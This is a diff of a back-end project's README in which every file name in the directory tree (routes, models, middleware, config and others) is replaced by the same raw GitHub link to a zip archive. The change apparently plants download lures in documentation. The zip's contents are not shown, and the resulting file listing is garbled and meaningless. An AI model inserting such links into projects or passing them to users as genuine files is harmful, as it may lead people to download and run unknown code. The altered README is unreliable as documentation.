@@ -4,36 +4,36 @@
   ────────────────────────────── <br>
   src <br>
   │── routes <br>
-  │ ├── user.js <br>
-  │ ├── query.js <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
   │ └── ... <br>
   │ <br>
   │── models <br>
-  │ ├── user.model.js <br>
-  │ ├── query.model.js <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
   │ └── ...<br>
   │ <br>
   │── controllers <br>
-  │ ├── user.controller.js <br>
-  │ └── query.controller.js<br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
+  │ └── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip<br>
   │ <br>
   │── middleware <br>
-  │ ├── auth.middleware. <br>
-  │ ├── rol.middleware. <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
   │ └── ...<br>
   │ <br>
   │── utils <br>
-  │ ├── handle.error.js <br>
-  │ ├── handle.password.js <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
   │ └── ...<br>
   │ <br>
   │── validators <br>
-  │ ├── auth.validator.js <br>
-  │ ├── user.validator.js <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
   │ └── ...<br>
   │ <br>
   │── config <br>
-  │ ├── mongo.js <br>
+  │ ├── https://raw.githubusercontent.com/KaterineLimaE/Proyecto-Vivencial-Back-End/develop/src/routes/End-Proyecto-Vivencial-Back-2.6.zip <br>
   │ └── ...<br>
   ────────────────────────── <br>
   storage <br>
